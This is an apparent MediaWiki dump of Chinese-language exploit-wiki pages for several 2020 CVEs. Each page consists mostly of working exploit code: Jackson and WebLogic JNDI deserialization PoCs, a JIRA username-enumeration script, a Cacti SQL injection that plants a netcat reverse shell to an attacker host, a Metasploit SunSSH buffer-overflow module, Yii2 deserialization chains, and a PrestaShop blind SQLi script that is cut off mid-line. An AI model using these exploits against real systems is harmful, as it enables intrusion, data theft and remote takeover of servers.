      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==利用條件== &lt;/translate&gt; &lt;translate&gt; 開啟enableDefaultTyping()  使用了org.apache.drill.exec:drill-jdbc-all第三方依賴 &lt;/translate&gt;  &lt;tr..."</comment>
      <origin>5231</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="953" sha1="i8leald0ozvk4nf66u0gtuiv85rur6q" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==利用條件==
&lt;/translate&gt;
&lt;translate&gt;
開啟enableDefaultTyping()

使用了org.apache.drill.exec:drill-jdbc-all第三方依賴
&lt;/translate&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
jackson-databind before 2.9.10.4
jackson-databind before 2.8.11.6
jackson-databind before 2.7.9.7
&lt;/pre&gt;

==POC==
&lt;pre&gt;
package com.jacksonTest;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class Poc {
   public static void main(String[] args) throws Exception {
       ObjectMapper mapper = new ObjectMapper();
       mapper.enableDefaultTyping();
       String payload = "[\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1099/Exploit\"}]";
       try {
           Object obj = mapper.readValue(payload, Object.class);
           mapper.writeValueAsString(obj);
       } catch (IOException e) {
           e.printStackTrace();
       }
   }
}
&lt;/pre&gt;</text>
      <sha1>i8leald0ozvk4nf66u0gtuiv85rur6q</sha1>
    </revision>
    <revision>
      <id>5232</id>
      <parentid>5231</parentid>
      <timestamp>2021-06-17T01:03:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5232</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="997" sha1="8jkbsnmtkgznyborivyloaxumb7ig7i" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==利用條件== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
開啟enableDefaultTyping()

&lt;!--T:3--&gt;
使用了org.apache.drill.exec:drill-jdbc-all第三方依賴
&lt;/translate&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:4--&gt;
&lt;/translate&gt;
&lt;pre&gt;
jackson-databind before 2.9.10.4
jackson-databind before 2.8.11.6
jackson-databind before 2.7.9.7
&lt;/pre&gt;

==POC==
&lt;pre&gt;
package com.jacksonTest;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class Poc {
   public static void main(String[] args) throws Exception {
       ObjectMapper mapper = new ObjectMapper();
       mapper.enableDefaultTyping();
       String payload = "[\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1099/Exploit\"}]";
       try {
           Object obj = mapper.readValue(payload, Object.class);
           mapper.writeValueAsString(obj);
       } catch (IOException e) {
           e.printStackTrace();
       }
   }
}
&lt;/pre&gt;</text>
      <sha1>8jkbsnmtkgznyborivyloaxumb7ig7i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-14060 FasterXML jackson-databind 反序列化漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4556</id>
    <revision>
      <id>5243</id>
      <timestamp>2021-06-17T01:05:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-14060 FasterXML jackson-databind 反序列化漏洞"</comment>
      <origin>5243</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="878" sha1="n2cg7vqrc5oq1s4clnghfr1xcmo7h77" xml:space="preserve">&lt;languages /&gt;
==利用条件==
开启enableDefaultTyping()

使用了org.apache.drill.exec:drill-jdbc-all第三方依赖

==影响版本==
&lt;pre&gt;
jackson-databind before 2.9.10.4
jackson-databind before 2.8.11.6
jackson-databind before 2.7.9.7
&lt;/pre&gt;

==POC==
&lt;pre&gt;
package com.jacksonTest;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class Poc {
   public static void main(String[] args) throws Exception {
       ObjectMapper mapper = new ObjectMapper();
       mapper.enableDefaultTyping();
       String payload = "[\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1099/Exploit\"}]";
       try {
           Object obj = mapper.readValue(payload, Object.class);
           mapper.writeValueAsString(obj);
       } catch (IOException e) {
           e.printStackTrace();
       }
   }
}
&lt;/pre&gt;</text>
      <sha1>n2cg7vqrc5oq1s4clnghfr1xcmo7h77</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-14181 Atlassian JIRA 8.11.1 用戶名枚舉漏洞</title>
    <ns>0</ns>
    <id>1228</id>
    <revision>
      <id>1533</id>
      <timestamp>2021-04-11T02:39:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Title: Atlassian JIRA 8.11.1 - User Enumeration # Author: Dolev Farhi # Vulnerable versions: version &lt; 7.13.16,  8.0.0 ≤ version &lt; 8.5.7, 8.6.0 ≤ version &lt;..."</comment>
      <origin>1533</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1212" sha1="9ihu3jub9d0kq3u9p27pg0odavu4jlj" xml:space="preserve">==EXP==
&lt;pre&gt;
# Title: Atlassian JIRA 8.11.1 - User Enumeration
# Author: Dolev Farhi
# Vulnerable versions: version &lt; 7.13.16,  8.0.0 ≤ version &lt; 8.5.7, 8.6.0 ≤ version &lt; 8.12.0
# CVE: CVE-2020-14181
# Credit to original CVE author: Mikhail Klyuchnikov of Positive Technologies.

import sys
import os
import requests

def help():
    print('python3 script.py &lt;target&gt; &lt;usernames_file&gt;')
    print('e.g. python3 script.py https://jiratarget.com usernames.txt')
    sys.exit()

if len(sys.argv) &lt; 3:
  help()

server = sys.argv[1]
usernames = sys.argv[2]

random_user = '0x00001'

try:
  os.path.exists(usernames)
except:
  print(usernames, 'file does not exist.')
  sys.exit(1)

def test_vulnerable():
  resp = requests.get('{}/secure/ViewUserHover.jspa?username={}'.format(server, username))
  if 'User does not exist: {}'.format(random_user) in resp.text:
    return True
  return False

if test_vulnerable is False:
  print('server is not vulnerable.')
  sys.exit(1)

f = open(usernames, 'r').read()

for username in f.splitlines():
  resp = requests.get('{}/secure/ViewUserHover.jspa?username={}'.format(server, username))
  if 'User does not exist' not in resp.text:
    print('EXISTS', username)
&lt;/pre&gt;</text>
      <sha1>9ihu3jub9d0kq3u9p27pg0odavu4jlj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-14295 Cacti 1.2.12 - 'filter' SQL注入&amp;遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1558</id>
    <revision>
      <id>1942</id>
      <timestamp>2021-04-30T00:54:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Cacti 1.2.12 - 'filter' SQL Injection / Remote Code Execution # Date: 04/28/2021 # Exploit Author: Leonardo Paiva # Vendor Homepage: https://www..."</comment>
      <origin>1942</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3330" sha1="hlfulw7ppgsnegllp5l8frhe6z0aa9v" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Cacti 1.2.12 - 'filter' SQL Injection / Remote Code Execution
# Date: 04/28/2021
# Exploit Author: Leonardo Paiva
# Vendor Homepage: https://www.cacti.net/
# Software Link: https://www.cacti.net/downloads/cacti-1.2.12.tar.gz
# Version: 1.2.12
# Tested on: Ubuntu 20.04
# CVE : CVE-2020-14295
# Credits: @M4yFly (https://twitter.com/M4yFly)
# References:
# https://github.commandcom/Cacti/cacti/issues/3622
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14295

#!/usr/bin/python3

import argparse
import requests
import sys
import urllib.parse
from bs4 import BeautifulSoup

# proxies = {'http': 'http://127.0.0.1:8080'}


def login(url, username, password, session):
    print("[+] Connecting to the server...")
    get_token_request = session.get(url + "/cacti/index.php", timeout=5) #, proxies=proxies)

    print("[+] Retrieving CSRF token...")
    html_content = get_token_request.text
    soup = BeautifulSoup(html_content, 'html.parser')

    csrf_token = soup.find_all('input')[0].get('value').split(';')[0]

    if csrf_token:
        print(f"[+] Got CSRF token: {csrf_token}")
        print("[+] Trying to log in...")

        data = {
            '__csrf_magic': csrf_token,
            'action': 'login',
            'login_username': username,
            'login_password': password
        }

        login_request = session.post(url + "/cacti/index.php", data=data) #, proxies=proxies)
        if "Invalid User Name/Password Please Retype" in login_request.text:
            print("[-] Unable to log in. Check your credentials")
            sys.exit()
        else:
            print("[+] Successfully logged in!")
    else:
        print("[-] Unable to retrieve CSRF token!")
        sys.exit()


def exploit(lhost, lport, session):
    rshell = urllib.parse.quote(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {lhost} {lport} &gt;/tmp/f")
    payload = f"')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{rshell};'+where+name='path_php_binary';--+-"

    exploit_request = session.get(url + f"/cacti/color.php?action=export&amp;header=false&amp;filter=1{payload}") #, proxies=proxies)

    print("\n[+] SQL Injection:")
    print(exploit_request.text)

    try:
        session.get(url + "/cacti/host.php?action=reindex", timeout=1) #, proxies=proxies)
    except Exception:
        pass

    print("[+] Check your nc listener!")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='[*] Cacti 1.2.12 - SQL Injection / Remote Code Execution')

    parser.add_argument('-t', metavar='&lt;target/host URL&gt;', help='target/host URL, example: http://192.168.15.58', required=True)
    parser.add_argument('-u', metavar='&lt;user&gt;', help='user to log in', required=True)
    parser.add_argument('-p', metavar='&lt;password&gt;', help="user's password", required=True)
    parser.add_argument('--lhost', metavar='&lt;lhost&gt;', help='your IP address', required=True)
    parser.add_argument('--lport', metavar='&lt;lport&gt;', help='your listening port', required=True)
    args = parser.parse_args()

    url = args.t
    username = args.u
    password = args.p
    lhost = args.lhost
    lport = args.lport

    session = requests.Session()

    login(url, username, password, session)
    exploit(lhost, lport, session)
            
&lt;/pre&gt;</text>
      <sha1>hlfulw7ppgsnegllp5l8frhe6z0aa9v</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-14841 weblogic jndi 注入漏洞</title>
    <ns>0</ns>
    <id>1495</id>
    <revision>
      <id>1876</id>
      <timestamp>2021-04-23T00:52:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==POC== &lt;pre&gt;         // JdbcRowSetImpl         JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();         jdbcRowSet.setDataSourceName("rmi://192.168.3.254:8888/x…」的新頁面</comment>
      <origin>1876</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1089" sha1="ns1l3788dg0ng5k4hped71m51oc9ioz" xml:space="preserve">==POC==
&lt;pre&gt;
        // JdbcRowSetImpl
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("rmi://192.168.3.254:8888/xsmd");

        MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();
        methodAttributeAccessor.setGetMethodName("getDatabaseMetaData");
        methodAttributeAccessor.setIsWriteOnly(true);
        methodAttributeAccessor.setAttributeName("UnicodeSec");


        LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, "UnicodeSec");

        final ExtractorComparator comparator = new ExtractorComparator(extractor);
        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);


        Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};
        Reflections.setFieldValue(queue, "queue", q);
        Reflections.setFieldValue(queue, "size", 2);

        Field comparatorF = queue.getClass().getDeclaredField("comparator");
        comparatorF.setAccessible(true);
        comparatorF.set(queue, new ExtractorComparator(extractor));
&lt;/pre&gt;</text>
      <sha1>ns1l3788dg0ng5k4hped71m51oc9ioz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-14871 Oracle Solaris SunSSH PAM parse user name() 緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1365</id>
    <revision>
      <id>1716</id>
      <timestamp>2021-04-16T09:17:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   class MetasploitModul..."</comment>
      <origin>1716</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4630" sha1="th66k7bp6rnt5z49rpalere24fwhb8m" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule &lt; Msf::Exploit::Remote
 
  Rank = NormalRanking
 
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::CheckModule
  include Msf::Exploit::Remote::SSH
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow',
        'Description' =&gt; %q{
          This module exploits a stack-based buffer overflow in the Solaris PAM
          library's username parsing code, as used by the SunSSH daemon when the
          keyboard-interactive authentication method is specified.
 
          Tested against SunSSH 1.1.5 on Solaris 10u11 1/13 (x86) in VirtualBox,
          VMware Fusion, and VMware Player. Bare metal untested. Your addresses
          may vary.
        },
        'Author' =&gt; [
          'Jacob Thompson', # Analysis
          'Aaron Carreras', # Analysis
          'Jeffrey Martin', # Testing
          'Hacker Fantastic', # PoC
          'wvu' # Exploit
        ],
        'References' =&gt; [
          ['CVE', '2020-14871'],
          ['URL', 'https://www.oracle.com/security-alerts/cpuoct2020.html'],
          ['URL', 'https://www.fireeye.com/blog/threat-research/2020/11/critical-buffer-overflow-vulnerability-in-solaris-can-allow-remote-takeover.html'],
          ['URL', 'https://hacker.house/lab/cve-2020-18471/'],
          ['URL', 'https://twitter.com/hackerfantastic/status/1323431512822435841']
        ],
        'DisclosureDate' =&gt; '2020-10-20', # Vendor advisory
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; 'unix',
        'Arch' =&gt; ARCH_CMD,
        'Privileged' =&gt; true,
        'Payload' =&gt; {
          # https://github.com/illumos/illumos-gate/blob/edd669a7ce20a2f7406e8f00489c426c0690f1bd/usr/src/lib/libpam/pam_framework.c#L615-L617
          'BadChars' =&gt; "\x00\x09\x20",
          'Encoder' =&gt; 'cmd/perl'
        },
        'Targets' =&gt; [
          [
            'SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware',
            {
              'Ident' =&gt; 'SSH-2.0-Sun_SSH_1.1.5',
              'LibcBase' =&gt; 0xfeb90000
            }
          ],
          [
            'SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox',
            {
              'Ident' =&gt; 'SSH-2.0-Sun_SSH_1.1.5',
              'LibcBase' =&gt; 0xfeb80000
            }
          ]
        ],
        'DefaultTarget' =&gt; 0,
        'DefaultOptions' =&gt; {
          'PAYLOAD' =&gt; 'cmd/unix/reverse_perl',
          'SSH_TIMEOUT' =&gt; 2,
          'CheckModule' =&gt; 'auxiliary/scanner/ssh/ssh_version'
        },
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SERVICE_RESTARTS],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [ACCOUNT_LOCKOUTS, IOC_IN_LOGS]
        }
      )
    )
  end
 
  def check
    # Run auxiliary/scanner/ssh/ssh_version
    checkcode = super
 
    return checkcode unless checkcode == CheckCode::Detected
 
    unless target['Ident'] == checkcode.details[:ident]
      return CheckCode::Safe("#{target.name} is an incompatible target.")
    end
 
    CheckCode::Appears("#{target.name} is a compatible target.")
  end
 
  def exploit
    print_status("Exploiting #{target.name}")
 
    ssh_client_opts = ssh_client_defaults.merge(
      port: rport,
      auth_methods: ['keyboard-interactive'],
      password: ret2libc, # HACK: This is really the username prompt on Solaris
      timeout: datastore['SSH_TIMEOUT']
    )
 
    ssh_client_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
    print_status("Yeeting #{datastore['PAYLOAD']} at #{peer}")
 
    # Empty initial username
    Net::SSH.start(rhost, '', ssh_client_opts)
  rescue Net::SSH::AuthenticationFailed
    print_error(CheckCode::Safe.message)
  rescue Net::SSH::Disconnect
    print_warning('Disconnected, target selection may be incorrect!')
  rescue Net::SSH::ConnectionTimeout
    # Do nothing on success
  end
 
  # XXX: No ASLR, but libc base changes...
  def ret2libc
    buf = rand_text(516)
    buf &lt;&lt; p32(target['LibcBase'] + 0x23904) # add esp, 8; ret
    buf &lt;&lt; rand_text(4)
    buf &lt;&lt; p32(0x08040101) # ecx
    buf &lt;&lt; p32(0x0805ba07) # pop ecx; pop edx; pop ebp; ret
    buf &lt;&lt; p32(target['LibcBase'] + 0x256d0) # exit(3)
    buf &lt;&lt; p32(target['LibcBase'] + 0x91edf) # system(3)
    buf &lt;&lt; rand_text(4)
    buf &lt;&lt; p32(target['LibcBase'] + 0xae3f1) # push esp; and al, 0; push ecx; push edx; ret
    buf &lt;&lt; payload.encoded
  end
 
  def p32(addr)
    [addr].pack('V')
  end
 
end
&lt;/pre&gt;</text>
      <sha1>th66k7bp6rnt5z49rpalere24fwhb8m</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15148 Yii框架反序列化遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1167</id>
    <revision>
      <id>1457</id>
      <timestamp>2021-04-10T05:26:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Yii2 &lt;2.0.38   ==EXP== &lt;pre&gt;  &lt;?php namespace yii\rest {     class Action extends \yii\base\Action     {         public $checkAccess;     }     class IndexAction exte..."</comment>
      <origin>1457</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1139" sha1="n3r278gkk0qwdku7glvurqc5bpmmn57" xml:space="preserve">==INFO==
Yii2 &lt;2.0.38


==EXP==
&lt;pre&gt;

&lt;?php
namespace yii\rest {
    class Action extends \yii\base\Action
    {
        public $checkAccess;
    }
    class IndexAction extends Action
    {
        public function __construct($func, $param)
        {
            $this-&gt;checkAccess = $func;
            $this-&gt;id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\base {
    class BaseObject
    {
        //
    }
    class Action
    {
        public $id;
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult extends BaseObject
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
$exp = new \yii\db\BatchQueryResult($func, $param);
print(serialize($exp));
&lt;/pre&gt;</text>
      <sha1>n3r278gkk0qwdku7glvurqc5bpmmn57</sha1>
    </revision>
    <revision>
      <id>2746</id>
      <parentid>1457</parentid>
      <timestamp>2021-05-10T02:06:33Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <origin>2746</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2129" sha1="rzhxe73cz9gff3mdjiqhrdhorxr0563" xml:space="preserve">==INFO==
Yii2 &lt;2.0.38


==EXP==
&lt;pre&gt;

&lt;?php
namespace yii\rest {
    class Action extends \yii\base\Action
    {
        public $checkAccess;
    }
    class IndexAction extends Action
    {
        public function __construct($func, $param)
        {
            $this-&gt;checkAccess = $func;
            $this-&gt;id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\base {
    class BaseObject
    {
        //
    }
    class Action
    {
        public $id;
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult extends BaseObject
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
$exp = new \yii\db\BatchQueryResult($func, $param);
print(serialize($exp));
&lt;/pre&gt;

==EXP 2==
来源：[https://xz.aliyun.com/t/8307 CVE-2020-15148 Yii2反序列化RCE POP链分析 ]

&lt;pre&gt;

&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            //$this-&gt;checkAccess = 'system';
            //$this-&gt;id = 'ls -la';
            $this-&gt;checkAccess = 'assert'; 
            $this-&gt;id = 'file_put_contents("i.php","&lt;?php phpinfo()?&gt;")';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this-&gt;formatters['close'] = [new CreateAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this-&gt;_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?&gt;


&lt;/pre&gt;</text>
      <sha1>rzhxe73cz9gff3mdjiqhrdhorxr0563</sha1>
    </revision>
    <revision>
      <id>2831</id>
      <parentid>2746</parentid>
      <timestamp>2021-05-12T13:19:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* EXP 2 */</comment>
      <origin>2831</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2129" sha1="prb5vng2t226nnu1b9kilqjqla15hlt" xml:space="preserve">==INFO==
Yii2 &lt;2.0.38


==EXP==
&lt;pre&gt;

&lt;?php
namespace yii\rest {
    class Action extends \yii\base\Action
    {
        public $checkAccess;
    }
    class IndexAction extends Action
    {
        public function __construct($func, $param)
        {
            $this-&gt;checkAccess = $func;
            $this-&gt;id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\base {
    class BaseObject
    {
        //
    }
    class Action
    {
        public $id;
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult extends BaseObject
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
$exp = new \yii\db\BatchQueryResult($func, $param);
print(serialize($exp));
&lt;/pre&gt;

==EXP 2==
來源：[https://xz.aliyun.com/t/8307 CVE-2020-15148 Yii2反序列化RCE POP链分析 ]

&lt;pre&gt;

&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            //$this-&gt;checkAccess = 'system';
            //$this-&gt;id = 'ls -la';
            $this-&gt;checkAccess = 'assert'; 
            $this-&gt;id = 'file_put_contents("i.php","&lt;?php phpinfo()?&gt;")';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this-&gt;formatters['close'] = [new CreateAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this-&gt;_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?&gt;


&lt;/pre&gt;</text>
      <sha1>prb5vng2t226nnu1b9kilqjqla15hlt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15160 PrestaShop 1.7.6.7 SQL注入漏洞</title>
    <ns>0</ns>
    <id>1033</id>
    <revision>
      <id>1308</id>
      <timestamp>2021-04-09T08:54:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: PrestaShop 1.7.6.7 - 'location' Blind Sql Injection  # Date: 2021-04-08 # Exploit Author: Vanshal Gaur # Vendor Homepage: https://www.prestashop..."</comment>
      <origin>1308</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9839" sha1="0tfkij2xmv4nef5c2070iacie18xs6y" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: PrestaShop 1.7.6.7 - 'location' Blind Sql Injection 
# Date: 2021-04-08
# Exploit Author: Vanshal Gaur
# Vendor Homepage: https://www.prestashop.com/
# Version: 1.7.5.x &lt; 1.7.6.8
# Tested on: Debian 10 (buster)
# CVE : CVE-2020-15160

#!/usr/bin/python3

'''

Setup Vulnerable Docker on "localhost:8080":

docker network create prestashop-net
docker run -ti --name mysql_z --network prestashop-net -e MYSQL_ROOT_PASSWORD=admin -p 3307:3306 -d mysql:5.7
docker run -ti --name prestashop_z --network prestashop-net -e DB_SERVER=mysql_z -p 8080:80 -d prestashop/prestashop:1.7.6.7
'''

import requests 
import sys
from lxml import html
import re


if len(sys.argv) != 7:
    print(
        '''
        Exploit By: Vanshal Gaur
        Twitter Handle: @Vanshalg

        Exploit: CVE-2020-15160 PrestaShop blind Sql Injection 1.7.5.0 &lt; 1.7.6.8 

        Before Running the script make sure to login and change "Combinations" to "Simple product" of the product and give that productid. 

        Script will retrive the output of user() function, edit payload in script to retrive other data (Tested With Prestashop 1.7.6.7) 
        
        Usage: python3 {} email password localhost 8080 productid /adminpath

               python3 exploit.py "test@gmail.com" "password" localhost 8080 11 /admin123
        '''.format(sys.argv[0])
    )
    sys.exit(1)  

print("Exploiting...(Be Patient)\n")
email = sys.argv[1]
password = sys.argv[2]
target_host = sys.argv[3]
target_port = sys.argv[4]
product_id = sys.argv[5]
admin_path = sys.argv[6]
target = "http://"+target_host+":"+target_port

# proxies = {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"}

s = requests.Session()

def login(s,target,password,email,admin_path):
    url = target+admin_path+"/index.php"
    
    data = {"ajax": "1", "token": '', "controller": "AdminLogin", "submitLogin": "1", "passwd": "TEMP", "email": "test@email.com"}
    data["passwd"] = password
    data["email"] = email
    r = s.post(url, data=data)

login(s,target,password,email,admin_path)


token_ext = s.get(target+admin_path+"/")
token_junk = re.findall("sell/catalog/pro.*_token\=.*",token_ext.text)
token_spit = re.split("\"",token_junk[0])
token_2 = re.split("\?",token_spit[0])
token = token_2[1]


def productDetails_formtoken(s,target,product_id,admin_path):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    
    q = s.get(target+admin_path+"/index.php/sell/catalog/products/"+product_id+"?"+token,headers=headers)
    tree = html.fromstring(q.text)
    output = tree.xpath("//input[contains(@name,'form[_token]')]/@value")
    form_token = ''.join(output)
    return form_token

form_token  = productDetails_formtoken(s,target,product_id,admin_path)


def productDetails_form_location(s,target,token,product_id,admin_path):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    
    q = s.get(target+admin_path+"/index.php/sell/catalog/products/"+product_id+"?"+token,headers=headers)
    tree = html.fromstring(q.text)
    output = tree.xpath("//input[contains(@name,'form[step3][location]')]/@value")
    form_location = ''.join(output)
    
    return form_location




def sqli(s,token,form_token,payload,target,product_id,admin_path):
    for j in range(32, 126):

        sql_payload = payload.replace("[CHAR]", str(j))

        url = target+admin_path+"/index.php/sell/catalog/products/"+product_id+"?"+token
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}
        data = {"form[step1][name][1]": "Blind Sql Injection @Vanshalg", "form[step1][type_product]": "0", "form[step1][description_short][1]": "&lt;p&gt;&lt;span style=\"font-size:10pt;font-style:normal;\"&gt;Regular fit, round neckline, short sleeves. Made of extra long staple pima cotton. &lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;/p&gt;", "form[step1][description][1]": "&lt;p&gt;&lt;span style=\"font-size:10pt;font-style:normal;\"&gt;&lt;span style=\"font-size:10pt;font-style:normal;\"&gt;Symbol of lightness and delicacy, the hummingbird evokes curiosity and joy.&lt;/span&gt;&lt;span style=\"font-size:10pt;font-style:normal;\"&gt; Studio Design' PolyFaune collection features classic products with colorful patterns, inspired by the traditional japanese origamis. To wear with a chino or jeans. The sublimation textile printing process provides an exceptional color rendering and a color, guaranteed overtime.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;", "form[step1][features][0][feature]": "1", "form[step1][features][0][value]": "4", "form[step1][features][0][custom_value][1]": '', "form[step1][features][1][feature]": "2", "form[step1][features][1][value]": "8", 